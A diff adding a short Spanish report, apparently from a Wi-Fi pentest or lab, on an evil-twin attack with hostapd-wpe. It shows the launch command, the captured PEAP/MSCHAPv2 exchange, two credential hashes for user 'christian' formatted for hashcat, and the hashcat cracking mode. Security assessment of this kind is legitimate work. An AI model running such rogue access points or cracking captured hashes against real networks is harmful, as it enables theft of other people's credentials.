@@ -1,0 +1,38 @@
+# Evil Twin — hostapd-wpe
+
+## Comando ejecutado
+
+```bash
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+```
+
+## Flujo de autenticación capturado
+
+El cliente `60:ff:9e:6d:b9:5e` se conectó al AP falso y completó el intercambio EAP:
+
+1. Autenticación 802.11 → asociación (AID 1)
+2. Inicio EAP → método propuesto: PEAP (método 25)
+3. Identidad recibida: `christian`
+4. Intercambio MSCHAPv2 completado → hash capturado
+
+## Hashes obtenidos
+
+**Sesión 1** — 08:27:42
+```
+username:  christian
+challenge: e1:d2:5b:3a:be:d1:29:ed
+response:  48:d9:d1:3f:88:c8:1d:f2:69:b1:fe:b9:93:67:ba:98:f6:d0:a7:a9:03:6e:87:e2
+
+hashcat:   christian::::48d9d13f88c81df269b1feb99367ba98f6d0a7a9036e87e2:e1d25b3abed129ed
+```
+
+**Sesión 2** — 08:47:46
+```
+username:  christian
+challenge: c8:f6:ab:09:c7:a3:bc:26
+response:  a7:3f:77:2f:88:41:79:e5:b7:bd:0b:70:a6:2d:81:f9:ce:a9:1d:54:ec:57:c6:75
+
+hashcat:   christian::::a73f772f884179e5b7bd0b70a62d81f9cea91d54ec57c675:c8f6ab09c7a3bc26
+```
+
+> Formato: NetNTLMv1 — listo para cracking con `hashcat -m 5500`.
